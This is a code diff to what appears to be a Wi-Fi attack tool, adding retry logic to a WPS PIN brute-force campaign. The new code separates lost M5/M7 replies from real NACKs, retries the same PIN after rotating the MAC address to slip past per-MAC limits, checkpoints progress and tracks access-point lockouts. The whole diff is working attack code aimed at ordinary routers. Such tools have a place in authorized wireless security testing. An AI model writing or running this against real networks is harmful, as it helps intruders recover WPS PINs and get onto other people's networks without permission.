@@ -95,6 +95,7 @@ def run_progress_line(state: CampaignState) -> Optional[str]:
 
 class WpsCampaign(Campaign):
     _SAVE_EVERY = 16   # checkpoint the .run file every N attempts
+    _MAX_TIMEOUT_RETRIES = 8   # retries of a silent (lost-reply) attempt before conceding
 
     button_id = "btn-wps-pin"
     key = "wps"
@@ -159,6 +160,14 @@ class WpsCampaign(Campaign):
         # proactively after each oracle result so no attempt is wasted on a spent MAC.
         self._mac_reached_oracle = False
         self._ap_one_shot = False
+
+        # A silent timeout after M4/M6 is only *assumed* wrong (timeout-as-NACK). Once an
+        # AP has proven it sends explicit NACKs, a silent drop is instead a LOST reply — our
+        # HW auto-ACK'd the AP's M-frame so it won't resend — so we retry the same PIN rather
+        # than advance past a possibly-correct half. Bounded (_MAX_TIMEOUT_RETRIES) so a
+        # persistently-dropping RX still advances instead of wedging.
+        self._ap_sends_nacks = False
+        self._timeout_retries = 0
 
     # ---- persistence --------------------------------------------------------
     def _load_state(self) -> CampaignState:
@@ -425,6 +434,13 @@ class WpsCampaign(Campaign):
                 # EWMA: Exponentially Weighted Moving Average. tl;dr math
                 self._attempt_ewma = 0.7 * self._attempt_ewma + 0.3 * (time.monotonic() - t0)
                 self.state.attempts += 1
+
+                if self._should_retry_lost_reply(pin, out):
+                    self._rotate_mac()             # a fresh MAC may deliver the reply
+                    if self.state.attempts % self._SAVE_EVERY == 0:
+                        self._save_state()
+                    continue                       # retry the SAME pin — do not advance
+
                 self._apply_outcome(pin, out)
 
                 verify_terminal = (prev_phase == "verify" and out.result not in
@@ -501,6 +517,31 @@ class WpsCampaign(Campaign):
         if self._lock_end_at is None:
             return 0.0
         return max(0.0, self._lock_end_at - time.monotonic())
+
+    def _should_retry_lost_reply(self, pin: str, out: AttemptOutcome) -> bool:
+        """True if this half-wrong was inferred from *silence* on an AP we know sends
+        explicit NACKs — i.e. a lost reply, not a real rejection. Retry the same PIN
+        (caller rotates the MAC) instead of advancing. Bounded by _MAX_TIMEOUT_RETRIES so
+        a persistently-dropping RX eventually concedes rather than wedging on one PIN."""
+        if out.config_error is not None:
+            self._ap_sends_nacks = True   # this AP answers wrong guesses with a real NACK
+        silent_half_wrong = (
+            out.via_timeout and self._ap_sends_nacks
+            and out.result in (PinResult.FIRST_HALF_WRONG, PinResult.SECOND_HALF_WRONG))
+        if not silent_half_wrong:
+            self._timeout_retries = 0
+            return False
+        self._timeout_retries += 1
+        if self._timeout_retries > self._MAX_TIMEOUT_RETRIES:
+            self.log(f"trying [cyan]{pin}[/cyan] → [yellow]no reply after "
+                     f"{self._timeout_retries} tries[/yellow] — conceding as wrong")
+            self._timeout_retries = 0
+            return False                  # give up retrying; fall through to advance
+        lost = "M5" if out.result is PinResult.FIRST_HALF_WRONG else "M7"
+        self.log(f"trying [cyan]{pin}[/cyan] → [dim]no reply (likely a lost {lost}) — "
+                 f"retrying (#{self._timeout_retries})[/dim]")
+        self.lock.note_progress()         # a lost reply isn't a lock; keep the strike clean
+        return True
 
     def _after_attempt_mac_check(self, out: AttemptOutcome) -> None:
         """One-shot-per-MAC handling. Some APs (e.g. AirLink) answer the first WSC
